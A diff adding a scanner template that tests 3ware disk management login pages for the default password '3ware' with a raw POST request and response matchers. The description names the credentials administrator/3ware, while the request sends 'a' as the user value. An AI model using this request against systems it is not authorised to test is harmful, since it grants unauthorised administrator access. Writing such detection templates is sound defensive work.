@@ -1,0 +1,33 @@
+id: 3ware-default-password
+
+info:
+  name: 3ware login.html default password vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    3ware is a disk management system that has a default password vulnerability. Attackers can exploit the default credentials (administrator/3ware) to gain full control of the platform, utilizing administrator privileges to operate core functions.
+  reference:
+    - https://fofa.info/
+  tags: default-password
+
+http:
+  - raw:
+      - |
+        POST /login.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        whopwd=a&thepwd=3ware
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "TDMUSER"
+      - type: word
+        part: body
+        words:
+          - "logged"
